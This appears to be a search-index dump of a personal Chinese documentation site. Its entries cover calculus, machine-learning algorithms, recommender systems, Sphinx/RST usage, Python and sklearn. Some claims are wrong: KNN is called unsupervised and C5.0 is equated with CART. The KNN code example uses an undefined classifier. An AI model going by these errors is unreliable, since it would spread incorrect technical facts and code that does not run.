逻辑回归模型使用了sigmoid函数来建模，将线性组合的结果映射到0到1之间的概率。 模型形式可以表示为: P(Y=1|X) = 1 / (1 + exp(-z)) 其中P(Y=1|X)是属于类别1的概率，z是线性组合的结果。 参数估计： 线性回归 线性回归通常使用最小二乘法（Ordinary Least Squares）来估计回归系数。 目标是最小化观测值与模型预测值之间的平方差。 逻辑回归： 逻辑回归使用最大似然估计来估计回归系数。 目标是最大化观测值的似然函数，即最大化观测值为实际类别的概率。","tags":"AI","url":"/yq-doc-source-docs-AI-Digital-Logic-regression-and-linear-regression.html","loc":"/yq-doc-source-docs-AI-Digital-Logic-regression-and-linear-regression.html"},{"title":"积分和微分","text":"以下主要针对这样的一元函数: y = f(x) 想起以前大学的一个概念 可导一定连续, 连续不一定可导 古典微积分, 导数 古典微积分求解曲线围成的面积的主要思想，就是把曲线下的面积划分成了无数个矩形面积之和 （显然）直觉告诉我们，如果 越大，则这个近似越准确 此时，无穷小量就出现了。 在 古典微积分 学中，无穷小量是建立微积分的基础。 莱布尼兹介绍微积分的论文就叫做《论深度隐藏的几何学及无穷小与无穷大的分析》。 在当时的观点下，无穷小量到底是什么，也是颇有争论的。 当时有数学家打比喻：\"无穷小量就好比山上的灰尘，去掉和增加都没有什么影响\"，很显然有人认为这是真实存在的。 在具体计算曲线下面的面积，即我们现在所说的定积分的时候，必然会遇到导数的问题，所以很自然的开始了对导数的定义和讨论。 导数的古典定义 在曲线上取两点，连接起来所形成的直线，就称为曲线的割线： 连续的割线可以反应曲线的平均变化率。 也就是说，这一段曲线大概总的趋势是上升还是下降，上升了多少，用割线描述是并不是精确的。 有了切线之后我们进一步去定义导数 从这张图得出 导数 的定义 f'(x) = dy / dx 而 dx 和 dy 被称为 x 和 y 的 微分 ，都为无穷小量， 所以导数也被莱布尼兹称为 微商 (微分之商) 无穷小量导致的麻烦 上图实际上是有矛盾的 所以就古典微积分中切线的定义而言，微积分的基础就是不牢固的。 无穷小量的麻烦还远远不止这一些，x&#94;2 的导数是这样计算的: dx 先在除法中当作不为 0 的变量被约掉, 再在最后的加法中当作 0 被忽略. 一会是0一会又不是0。 无穷小量和无穷小量相除为什么可以得到不一样的值？难道不应该都是1？ 无穷小量还违反了 阿基米德公理 ，这个才是更严重的缺陷， 康托尔证明过，如果阿基米德公理被违背的话会出大问题。 一边是看起来没有错的微积分，一边是有严重缺陷的无穷小量，这就是第二次数学危机。 数学的严格性受到了挑战， \"对于数学，严格性不是一切，但是没有了严格性就没有了一切\"。 相关概念 无穷小量 在用古典微积分求解曲线围成的面积事， 把曲线对的定义域[a,b]均分成间隔长度 delta x (这应该是三角形符号, 我没找到, 暂时直接用英文) 为n份， 当 n->∞ 时， delta x 变成无穷小量，记作 dx ，即 x 的 微分 微分 微分是微小的增量，即无穷小量。在古典微积分学中，无穷小量是建立微积分的基础。 切线 通过无穷小量定义了切线。 导数 导数就是切线的斜率。 基于极限重建的微积分 莱布尼兹、欧拉等都认识到了无穷小量导致的麻烦， 一直拼命想要修补，但这个问题等了200年后，即19世纪极限概念的清晰之后才得到解决。 解决办法是，完全摈弃无穷小量，基于极限的概念，重新建立了微积分。 可以看到，极限的描述并没有用到什么无穷小量。 导数 的极限定义 用极限重新严格定义了导数，此时已经脱离了微商的概念。也就是此时，导数应该被看成一个整体。 不过我们仍然可以去定义什么是微分，说到这里，真是有点剧情反转: 古典微积分是先定义微分再定义导数， 现在极限微积分是先定义了导数再有微分。 相关概念 导数 导数被定义为一个极限，其意义就是变化率 微分 微分是一个线性函数，其意义就是变化的具体数值 切线 有了导数之后就可以被确定下来了 参考: https://zhuanlan.zhihu.com/p/38337248 古今微积分 微积分实际上被发明了两次。 古典微积分和极限微积分可以说是两个东西。我们再来比较一下古典微积分和极限微积分。 古典微积分是先定义微分再定义导数； 极限微积分是先定义导数再定义微分。 古典微积分的导数是基于无穷小量定义的； 极限微积分的导数是基于极限定义的 古典微积分的微分是无穷小量； 极限微积分的微分是一个线性函数。 古典微积分的定积分是求无穷小矩形面积的和；极限微积分的定积分是求黎曼和。 古典微积分的切线是画出来的； 极限微积分的切线是算出来的。 古典微积分的建立过程很直观； 极限微积分的建立过程更抽象。 古典微积分最大的好处就是很直观，不过也是因为太直观了， 所以我们一直都无法忘记它带来的印象，也对我们理解极限微积分造成了障碍。 也让我们在实际应用中造成了错误的理解。 加权积分 比如摸球, 蓝球 10 分, 红球 5 分, 最后的得分就是: 10 * nBlue + 5 * nRed 这里 10, 5 就是权","tags":"AI","url":"/yq-doc-source-docs-AI-Digital-Points-and-different-points.html","loc":"/yq-doc-source-docs-AI-Digital-Points-and-different-points.html"},{"title":"数理相关","text":"","tags":"AI","url":"/yq-doc-source-docs-AI-Digital-index.html","loc":"/yq-doc-source-docs-AI-Digital-index.html"},{"title":"决策树算法 Decision Tree","text":"注解 属于监督学习(样本与对应结果已知) 决策树（Decision Tree），它是一种以树形数据结构来展示决策规则和分类结果的模型， 作为一种归纳学习算法，其重点是将看似无序、杂乱的已知数据， 通过某种技术手段将它们转化成可以预测未知数据的树状模型， 每一条从根结点（对最终分类结果贡献最大的属性）到叶子结点（最终分类结果）的路径都代表一条决策的规则。 决策树就是形如下图的结构（机器学习西瓜书的图）： 机器学习中， 决策树是一个预测模型，树中每个节点表示某个对象，而每个分叉路径则代表某个可能的属性值， 而每个叶节点则对应从根节点到该叶节点所经历的路径所表示的对象的值。 决策树仅有单一输出，通常该算法用于解决分类问题。 一个决策树包含三种类型的节点： 决策节点：通常用矩形框来表示 机会节点：通常用圆圈来表示 终结点：通常用三角形来表示 简单决策树算法案例，确定人群中谁喜欢使用信用卡。 考虑人群的年龄和婚姻状况，如果年龄在30岁或是已婚， 人们更倾向于选择信用卡，反之则更少。 通过确定合适的属性来定义更多的类别，可以进一步扩展此决策树。 在这个例子中，如果一个人结婚了，他超过30岁，他们更有可能拥有信用卡（100% 偏好）。 测试数据用于生成决策树。 注解 对于那些各类别样本数量不一致的数据，在决策树当中信息增益的结果偏向于那些具有更多数值的特征。 构建决策树 训练阶段：从给定的训练数据集DB，构造出一颗决策树: class = DecisionTree(DB) 分类阶段：从根开始，按照决策树的分类属性， 从上往下，逐层划分。直到叶子节点，便能获得结果: y = DecisionTree(x) 熵 信息熵（Information Entropy） 条件熵 决策树的划分依据是 信息增益 : 所谓的信息增益是指 特征A对训练数据集D的信息增益g（D,A） 定义为 集合D的信息熵H(D) 与 特征A给定条件下D的信息条件熵H(D|A) 之差， 即公式为: g(D, A) = H(D) - H(D|A) 注解 信息增益表示得知特征X的信息而使得类Y的信息的不确定性减少的程度。 构造依据-熵 熵 表示数据的混乱程度, 理科的可以参考化学的 熵 熵越大, 数据越混乱, 不确定性越大, 越不确定 熵越小, 数据越不混乱, 不确定性越小, 越确定 我们用 Entropy 表示熵 所以当 Entropy 最大为1的时候，是分类效果最差的状态，当它最小为0的时候，是完全分类的状态。 决策树算法 上面也提到了, 构建决策树的过程就是寻找最优分割属性, 然后以 最大化信息增益(ID3, C4.5) 或 基尼不纯度(CART) 的方式一直递归划分下去 算法 描述 ID3 其核心是在决策树的各级节点上， 使用信息增益方法作为属性的选择标准， 来帮助确定生成每个节点时所采用的合适属性 C4.5 C4.5决策树生成算法相对于ID3算法的重要改进 是使用信息增益率来选择节点属性。 C4.5算法可以売服ID3算法存在的不足： ID3算法只适用于离散的描述属性， 而C4.5算法既能够处理离散的描述属性， 也可以处理连续的描述属性 CART CART决策树是一种十分有效的非参数分类和回归方法， 通过构建树、修剪树、评估树 来构建一个二叉树。 当终结点是连续变量时，该数为回归树； 当终结点是分类变量，该数为分类树 决策树算法-ID3 最大化信息增益, 基于信息熵和信息增益做分类； 信息增益等于未划分时数据集的信息熵，减去划分之后所有子数据集的信息熵之和。 ( Gain(D,A)表示用特征A划分得到的信息增益，H(D)表示未划分时D的信息熵，H(D|A)表示用特征A划分得到的所有子数据集的信息熵之和 ) ( Di 表示划分之后得到的子数据集数量，H(D|A) 就是各个子数据集信息熵 H(Di) 的加权求和,权重为子样本数占全部样本的比例 ) 决策树每次对数据集进行划分需要选择最优的划分特征， ID3就是对每个特征进行遍历，然后计算按此特征划分后得到的信息增益， 选择增益最大的特征进行数据集的划分。然后再对每个子数据集进行同样的划分操作。 缺点： ID3信息增益准则对可取值数目较多的特征有所偏好，比如ID类特征的信息增益可接近于1； 只能用于处理离散分布的特征，不能处理连续值与缺失值； 只能用于分类。 决策树算法-C4.5 最大化信息增益率, 基于信息增益率做分类，是ID3的改进版； C4.5是为了解决ID3的一个缺点而产生的。 缺点是啥？如果某个属性的分类很多，也就是分叉超多，那么该属性下的样本就很少， 此时的信息增益就非常高，ID3这个愣头青就会认为这个属性适合用作划分。 是，它确实是能划分，但取值较多的属性用作划分依据时，它的泛化能力弱， 没法对新样本有效预测，所以C4.5不依靠信息增益划分样本，而是依靠\"信息增益率\"。 为了克服ID3倾向于取值数目较多的特征的缺陷， C4.5在信息增益的基础上添加了分母项，引入了信息增益率，计算公式如下： 分母项Ha会对取值数目较多的特征进行惩罚， 特征取值数目越多，Ha越大，信息增益率就越小。 所以很好的解决了ID3的缺点1。 信息增益率同信息增益，都是越大越好。 注解 信息增益率虽然解决了倾向于取值较大的特征，但是又引入了倾向于取值较少特征的缺陷， 所以其选择特征时不是直接选取信息增益率最大的特征， 而是先从候选特征中找到信息增益高于平均值的特征，再从中选择使增益率最高的作为最优划分特征。 优点： 改进ID3倾向于选择取值较多的特征的缺点； 可处理连续值与缺失值。 缺点： 跟ID3一样只能用于分类； 计算量较大，计算信息熵有大量的对数运算，以及选取最优特征时，对连续值的排序等。 决策树算法-CART 基尼不纯度, 基于基尼系数，既可以做分类也可以做回归 CART决策树（Classification and Regression Tree）独立于另外两种决策树， 一方面它使用基尼指数（Gini Index）作为划分依据， 另一方面它既可以做分类，也可以做回归。 Python中的sklearn决策树模型就是采用的CART来选择分支的。 分类树 (Classification Tree)：目标是分类数据、离散数据。例如：动物种类、人的性别。 回归树 (Regression Tree)：目标是连续的数据。例如：人的年龄、收入 基尼指数Gini(D) 反映的是数据集中随机抽取两个样本， 而他们类别标志不一致的概率。 （e.g.从100封邮件中随机抽两个，而这两个邮件\"是垃圾邮件\"和\"不是垃圾邮件\"的概率） 基尼指数越小，代表数据集D的纯度越高。 C5.0又称为CART(分类回归树)，C5.0抛弃了用信息熵来衡量数据集的纯净度， 使用了一种更简单的计算方式，称为基尼系数，其公式如下 Gini(D)表示从D中随机抽取两个样本，这两个样本的标签不一样的概率。 概率越小，表示同类的样本数越多，数据集D越纯净，这性质与信息熵越大样本越纯净相反。 C5.0不再是考量划分前后信息熵的差距，而是基尼系数的差距。 C5.0的计算过程没有引入log对数计算，所以它的计算复杂度要优于ID3与C4.5。 优点： 使用 Gini 系数来度量样本纯净度，减少了大量的对数运算； 可同时用于分类与回归； 缺点： 跟ID3一样，都倾向于多取值特征。 参考:: 【非常详细】通俗易懂的讲解决策树（Decision Tree） 一文看懂决策树（Decision Tree） 决策树（Decision Tree）（三种原理+步骤） 《机器学习》之 深入浅出决策树(原理+代码)","tags":"AI","url":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Decision-Tree-algorithm-DECISION-TREE.html","loc":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Decision-Tree-algorithm-DECISION-TREE.html"},{"title":"降维算法 Dimensional Reduction","text":"在机器学习和统计学领域，降维是指在限定条件下，降低随机变量个数， 得到一组\"不相关\"主变量的过程，并可进一步细分为特征选择和特征提取两大方法。 一些数据集可能包含许多难以处理的变量。 特别是资源丰富的情况下，系统中的数据将非常详细。 在这种情况下，数据集可能包含数千个变量，其中大多数变量也可能是不必要的。 在这种情况下，几乎不可能确定对我们的预测影响最大的变量。 此时，我们需要使用降维算法，降维的过程中也可能需要用到其他算法， 例如借用随机森林，决策树来识别最重要的变量。","tags":"AI","url":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Dimensional-Reduction.html","loc":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Dimensional-Reduction.html"},{"title":"梯度增强算法 Gradient Boosting","text":"梯度增强算法（Gradient Boosting）使用多个弱算法来创建更强大的精确算法。 它与使用单个估计量不同，而是使用多个估计量创建一个更稳定和更健壮的算法。梯度增强算法有几种： XGBoost — 使用线性和树算法 LightGBM — 只使用基于树的算法 梯度增强算法的特点是精度较高。此外，LightGBM 算法具有令人难以置信的高性能。","tags":"AI","url":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Gradient-enhancement-algorithm-Gradient-Boosting.html","loc":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Gradient-enhancement-algorithm-Gradient-Boosting.html"},{"title":"k-平均算法 K-Means","text":"k-平均算法(K-Means)是一种无监督学习算法，为聚类问题提供了一种解决方案。 K-Means 算法把 n 个点（可以是样本的一次观察或一个实例）划分到 k 个集群（cluster）， 使得每个点都属于离他最近的均值（即聚类中心，centroid）对应的集群。 重复上述过程一直持续到重心不改变。","tags":"AI","url":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-K-average-algorithm-K-Means.html","loc":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-K-average-algorithm-K-Means.html"},{"title":"线性回归算法 Linear Regression","text":"回归分析(Regression Analysis)是统计学的数据分析方法， 目的在于了解两个或多个变量间是否相关、相关方向与强度， 并建立数学模型以便观察特定变量来预测其它变量的变化情况。 线性回归算法(Linear Regression)的建模过程就是使用数据点来寻找最佳拟合线。 公式: y = mx + c 其中 y 是因变量，x 是自变量，利用给定的数据集求 m 和 c 的值。 线性回归又分为两种类型，即 简单线性回归 (simple linear regression)，只有 1 个自变量； 多变量回归 (multiple regression)，至少两组以上自变量。","tags":"AI","url":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Linear-regression-algorithm-Linear-Regression.html","loc":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Linear-regression-algorithm-Linear-Regression.html"},{"title":"逻辑回归算法 Logistic Regression","text":"逻辑回归算法(Logistic Regression)一般用于需要明确输出的场景，如某些事件的发生(预测是否会发生降雨)。 通常，逻辑回归使用某种函数将概率值压缩到某一特定范围。 例如，Sigmoid 函数(S 函数)是一种具有 S 形曲线、用于二元分类的函数。 它将发生某事件的概率值转换为 0, 1 的范围表示: Y = E &#94; (b0＋b1 x) / (1 + E &#94; (b0＋b1 x ) ) 以上是一个简单的逻辑回归方程，B0，B1是常数。这些常数值将被计算获得，以确保预测值和实际值之间的误差最小。","tags":"AI","url":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Logic-regression-algorithm-logistic-regression.html","loc":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Logic-regression-algorithm-logistic-regression.html"},{"title":"朴素贝叶斯算法 Naive Bayes","text":"朴素贝叶斯算法（Naive Bayes）基于概率论的贝叶斯定理，应用非常广泛，从文本分类、垃圾邮件过滤器、医疗诊断等等。 朴素贝叶斯适用于特征之间的相互独立的场景，例如利用花瓣的长度和宽度来预测花的类型。 \"朴素\"的内涵可以理解为特征和特征之间独立性强。 与朴素贝叶斯算法密切相关的一个概念是最大似然估计(Maximum likelihood estimation)， 历史上大部分的最大似然估计理论也都是在贝叶斯统计中得到大发展。 例如，建立人口身高模型，很难有人力与物力去统计全国每个人的身高， 但是可以通过采样，获取部分人的身高，然后通过最大似然估计来获取分布的均值与方差。 注解 Naive Bayes is called naive because it assumes that each input variable is independent.","tags":"AI","url":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Naive-Bayes.html","loc":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Naive-Bayes.html"},{"title":"最近邻居/k-近邻算法(K-Nearest Neighbors,KNN)","text":"注解 属于无监督学习 KNN算法是一种基于实例的学习，或者是局部近似和将所有计算推迟到分类之后的惰性学习。 用最近的邻居（k）来预测未知数据点。 k 值是预测精度的一个关键因素，无论是分类还是回归，衡量邻居的权重都非常有用，较近邻居的权重比较远邻居的权重大 KNN 算法的缺点是对数据的局部结构非常敏感。 计算量大，需要对数据进行规范化处理，使每个数据点都在相同的范围。 举例: from sklearn import datasets from sklearn.neighbors import KNeighborsClassifier #digit dataset from sklearn digits = datasets.load_digits() #set training set x, y = digits.data[:-1], digits.target[:-1] #train model clf.fit(x,y) #predict y_pred = clf.predict([digits.data[-1]]) y_true = digits.target[-1] y_pred, y_true 延伸：KNN 的一个缺点是依赖于整个训练数据集， 学习向量量化（Learning Vector Quantization，LVQ)是一种监督学习的人神经网络算法， 允许你选择训练实例。 LVQ 由数据驱动，搜索距离它最近的两个神经元， 对于同类神经元采取拉拢，异类神经元采取排斥，最终得到数据的分布模式。 如果基于 KNN 可以获得较好的数据集分类效果， 利用 LVQ 可以减少存储训练数据集存储规模。 典型的学习矢量量化算法有LVQ1、LVQ2和LVQ3，尤以LVQ2的应用最为广泛。","tags":"AI","url":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Near-neighboring-K-Nearest-Neighbors-(KNN).html","loc":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Near-neighboring-K-Nearest-Neighbors-(KNN).html"},{"title":"随机森林算法 Random Forest","text":"属于集成学习 随机森林算法（Random Forest）的名称由 1995 年由贝尔实验室提出的random decision forests 而来， 正如它的名字所说的那样，随机森林可以看作一个决策树的集合。 随机森林中每棵决策树估计一个分类，这个过程称为\"投票（vote）\"。 理想情况下，我们根据每棵决策树的每个投票，选择最多投票的分类。 可以参考文档: https://www.stat.berkeley.edu/~breiman/randomforest2001.pdf 本地文档: ../../../../resources/pdf/randomforest2001.pdf","tags":"AI","url":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Random-Forest.html","loc":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Random-Forest.html"},{"title":"支持向量机算法(Support Vector Machine,SVM)","text":"支持向量机/网络算法(SVM)属于分类型算法。 SVM模型将实例表示为空间中的点，将使用一条直线分隔数据点。 需要注意的是，支持向量机需要对输入数据进行完全标记， 仅直接适用于两类任务，应用将多类任务需要减少到几个二元问题 举例: from sklearn import svm, datasets #digit dataset from sklearn digits = datasets.load_digits() #create the Support Vector Classifier clf = svm.SVC(gamma = 0.001, C = 100) #set training set x, y = digits.data[:-1], digits.target[:-1] #train model clf.fit(x, y) #predict y_pred = clf. predict([digits.data[-1]]) y_true = digits.target[-1] y_pred, y_true","tags":"AI","url":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Support-vector-machine-algorithm-(SVM).html","loc":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Support-vector-machine-algorithm-(SVM).html"},{"title":"机器学习算法","text":"机器学习算法大致可以分为三类： 监督学习算法 (Supervised Algorithms) 在监督学习训练过程中，可以由训练数据集学到或建立一个模式(函数 / learning model)， 并依此模式推测新的实例。 该算法要求特定的输入/输出，首先需要决定使用哪种数据作为范例。 例如，文字识别应用中一个手写的字符，或一行手写文字。 主要算法包括神经网络、支持向量机、最近邻居法、朴素贝叶斯法、决策树等。 无监督学习算法 (Unsupervised Algorithms) 这类算法没有特定的目标输出，算法将数据集分为不同的组。 强化学习算法 (Reinforcement Algorithms) 强化学习普适性强，主要基于决策进行训练，算法根据输出结果(决策)的成功或错误来训练自己， 通过大量经验训练优化后的算法将能够给出较好的预测。 类似有机体在环境给予的奖励或惩罚的刺激下，逐步形成对刺激的预期， 产生能获得最大利益的习惯性行为。 在运筹学和控制论的语境下，强化学习被称作\"近似动态规划\"(approximate dynamic programming，ADP)。 十大机器学习算法 参考: Machine Learning: 十大机器学习算法","tags":"AI","url":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-index.html","loc":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-index.html"},{"title":"推荐系统","text":"协同过滤 协同过滤步骤 收集用户偏好 用户行为如评分/投票/转发/收藏/评论 找到相似用户/物品 相似度计算 欧几里得距离 皮尔逊相关系数 协方差 .. $$ cov(x, y) = frac {sum _{i=0} (x_i - bar x)(y_i - bar y)} {n-1} $$ 皮尔逊 相关系数 .. $$ rho _x, _y = corr(x, y) = frac {cov(x, y)} {sigma _x sigma _y} = frac {E[(x - mu _x)(y - mu _y)]} {sigma _x sigma _y} $$ person 相关系数是用协方差除以两个变量标准差得到 Cosine相似度 (余弦距离) 计算推荐 分类 基于用户的协同过滤 存在问题 稀疏问题 用户量百万计，量大 人善变 （其实就是未来的分布无法保证于现在一致） 基于物品的协同过滤 物品与物品相似度 相对优点 计算性能高， 通常用户数量远大于物品数量 可预先计算保留， 物品不善变 隐语义模型 分解 组合","tags":"AI","url":"/yq-doc-source-docs-AI-Machine-learning-Recommended-system.html","loc":"/yq-doc-source-docs-AI-Machine-learning-Recommended-system.html"},{"title":"机器学习","text":"","tags":"AI","url":"/yq-doc-source-docs-AI-Machine-learning-index.html","loc":"/yq-doc-source-docs-AI-Machine-learning-index.html"},{"title":"开源模型","text":"","tags":"AI","url":"/yq-doc-source-docs-AI-Open-source-model-index.html","loc":"/yq-doc-source-docs-AI-Open-source-model-index.html"},{"title":"stable-diffusion","text":"安装-官方教程: https://github.com/AUTOMATIC1111/stable-diffusion-webui/wiki 我是N卡: 先去下载包: https://github.com/AUTOMATIC1111/stable-diffusion-webui/releases/download/v1.0.0-pre/sd.webui.zip 解压后，先 update.bat 再 run.bat","tags":"AI","url":"/yq-doc-source-docs-AI-Open-source-model-stable-diffusion.html","loc":"/yq-doc-source-docs-AI-Open-source-model-stable-diffusion.html"},{"title":"自建代理","text":"可参考: 66云美西9929 cn2-gia vps 搭建XRAY +bbr 七合一脚本 秒开4K 速度80000+ 完美科学上网 本地位置: ../../resources/pdf/66云美西9929 cn2-gia vps 搭建XRAY +bbr 七合一脚本 秒开4K 速度80000+ 完美科学上网 - 萝卜头网创联盟-萝卜头网创联盟.pdf 可使用此项目: https://github.com/mack-a/v2ray-agent","tags":"杂乱无章","url":"/yq-doc-source-docs-Chaotic-Self--built-agent.html","loc":"/yq-doc-source-docs-Chaotic-Self--built-agent.html"},{"title":"代码","text":"使用 code 或者 code-block 或者 直接双冒号 code code 不支持 linenos显示行号 code-block 支持选项: :emphasize-lines: 特别强调的行(高亮), 如 3,5 :linenos: 是否生成行号 :lineno-start: 起始行号, 如 2 :dedent: 忽略高亮显示行的错误 注解 上述部分指令可参见于: /docs/文档/rst标记语言/doc语法模块/index literalinclude 使用 literalinclude 直接引用文件内容: .. literalinclude:: ../../../../../resources/code/example1.nsi :language: nsis 双冒号 如使用Py执行文件: python xxx.py 源码: 如使用Py执行文件:: python xxx.py","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-Code.html","loc":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-Code.html"},{"title":"跨文档引用问题","text":"虽然可以通过在 conf.py 配置: extensions = [ 'sphinx.ext.autodoc', 'sphinx.ext.autosectionlabel', # 允许直接ref使用标题引用(否则需要给标题定义别名), # 支持跨文档标题引用(注意标题在多个文档中保持唯一), ] 主要是 sphinx.ext.autosectionlabel 来解决, 但是不建议这么做, 因为保不齐什么时候有个标题就是得重名. 使用 :doc: 倒是可以跨到文档, 但是不支持指定位置, 所以这个问题待解决吧.","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-question-Cross--document-reference-problem.html","loc":"/yq-doc-source-docs-document-RST-mark-language-question-Cross--document-reference-problem.html"},{"title":"跨文档超链接(引用)","text":"在一个rst文档中, 小节会自动加入到本文档的超链接中. 而要跨rst文档饮用另一个rst文本的小节/链接, 只有使用: :ref:`xxx` 而非: xxx_ 查看当前已生成的标记 查看当前已生成的ref标记, 一般都是生成在 build/html/objects.inv: python -m sphinx.ext.intersphinx build/html/objects.inv","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-question-Cross--text-super-link-(quotation).html","loc":"/yq-doc-source-docs-document-RST-mark-language-question-Cross--text-super-link-(quotation).html"},{"title":"自定义主题","text":"具体怎么自定义可以参考: /docs/文档/rst标记语言/sphinx自定义主题 不过有个坑点是, 使用pip安装的主题(我直接是安装的pytorch的那个主题). 可能内容比较老... 具体是不是很老没细看, 不过直接从pip安装好的 html 项目来看, 与github上的内容有些差距, 比如代码不一致, js文件缺失等, 导致一些报错. 所以这时候还是使用 github 上面的来参考吧.","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-question-Custom-theme.html","loc":"/yq-doc-source-docs-document-RST-mark-language-question-Custom-theme.html"},{"title":"文档超链接","text":"使用: :doc:`xxx` 详情见: CR_RST_DOC 此指令只可链接到文档","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-question-Document-hyperlink.html","loc":"/yq-doc-source-docs-document-RST-mark-language-question-Document-hyperlink.html"},{"title":"内嵌PDF到文档直接显示","text":"不支持...","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-question-Embedded-PDF-to-documentation.html","loc":"/yq-doc-source-docs-document-RST-mark-language-question-Embedded-PDF-to-documentation.html"},{"title":"target警告","text":"在同一篇文章中如果有相同的标题, 就会有警告. 但是有时候就是需要... , 比如: 标题1 小标题1 标题2 小标题1 貌似官方不建议这么做, 反正现在最新版还是有警告. 只有暂时忽略或者拆分成多个文档了.","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-question-Target-warning.html","loc":"/yq-doc-source-docs-document-RST-mark-language-question-Target-warning.html"},{"title":"set","text":"set的运算: s = set([3,5,9,10,20,40]) #创建一个数值集合 t = set([3,5,9,1,7,29,81]) #创建一个数值集合 a = t | s # t 和 s的并集 ,等价于t.union(s) b = t & s # t 和 s的交集 ,等价于t.intersection(s) c = t - s # 求差集（项在t中，但不在s中） ,等价于t.difference(s) d = t &#94; s # 对称差集（项在t或s中，但不会同时出现在二者中）,等价于t.symmetric_difference(s) 与list的区别 list见 /docs/后端/python/内置函数/list list是动态数据, 查询时会遍历整个数组, 最坏情况查询为 O(n) set是hash表实现, 查询复杂度只有 O(1)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-set.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-set.html"},{"title":"jupyter","text":"jupyter notebook 是一个网页形式的编辑器, 支持 在网页页面中直接编写代码和运行代码， 代码的运行结果也会直接在代码块下显示的程序。 如在编程过程中需要编写说明文档，可在同一个页面中直接编写，便于作及时的说明和解释。 安装: pip install jupyter 启动: jupyter notebook 结果就是在 当前目录 启动一个 jupyter 服务器, 一般就会自动跳到浏览器打开, 或者手动打开也行: http://localhost:8888/tree 注解 jupyter生成的文件不是纯正的 py 文件 MacOS下快捷键: Enter 在当前单元格换行 Command + Enter 执行当前单元格 Ctrl + Enter 执行当前单元格 Shift + Enter 执行当前单元格并新建一个单元格 jupyter notebook支持的选项 -h , --help 帮助信息 --port <port_number> 指定启动端口 --no-browser 启动但是不自动打开浏览器 --generate-config 生成默认配置文件","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-jupyter.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-jupyter.html"},{"title":"datasets","text":"load_wine 参数 return_X_ybool, default=False 当为 True 时, 返回 (data, target) 而不是整个数据对象. target及对应的分类结果 as_framebool, default=False 当为 True 时, 数据集是 pandas 的 DataFrame 类型, 会自动选择合适的数据类型, target亦是. New in version 0.23. 返回值 dataBunch 类字典对象, 具有以下属性 data{ndarray, dataframe} of shape (178, 13) 数据矩阵. 若 as_frame 参数为 True, 将会是 pandas DataFrame 类型. target: {ndarray, Series} of shape (178,) 数据分类结果. 若 as_frame 参数为 True, 将会是 pandas Series 类型. feature_names: list 数据集的列名称. target_names: list 目标分类的名称. frame: DataFrame of shape (178, 14) Only present when as_frame=True. DataFrame with data and target. New in version 0.23. DESCR: str 数据集描述 (data, target)tuple if return_X_y is True 默认为两个 ndarrays 的元组 第一个 shape 是 (178, 13), 每一行都表示一个样本 第二个 shape 是 (178,), 代表对应分类. 举例: >>> from sklearn.datasets import load_wine >>> data = load_wine() >>> data.target[[10, 80, 140]] array([0, 1, 2]) >>> list(data.target_names) ['class_0', 'class_1', 'class_2']","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-API-DataSets.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-API-DataSets.html"},{"title":"metrics","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-API-Metrics.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-API-Metrics.html"},{"title":"model_selection","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-API-Model_selection.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-API-Model_selection.html"},{"title":"impute","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-API-impure.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-API-impure.html"},{"title":"linear_model","text":"线性模型 LogisticRegression","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-API-linear_model.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-API-linear_model.html"},{"title":"简单使用教程","text":"以下将会使用 Wine 数据集, 可以直接代码下载: from sklearn.datasets import load_wine X,y = load_wine(return_X_y=True) 注解 wine 使用函数下载: sklearn.datasets.load_wine Estimators（估算器） Scitkit-learn 库提供了多种预构建算法，可以执行有监督和无监督的机器学习。它们通常被称为估算器。 为项目选择何种估计器取决于我们拥有的数据集和我们要解决的问题。 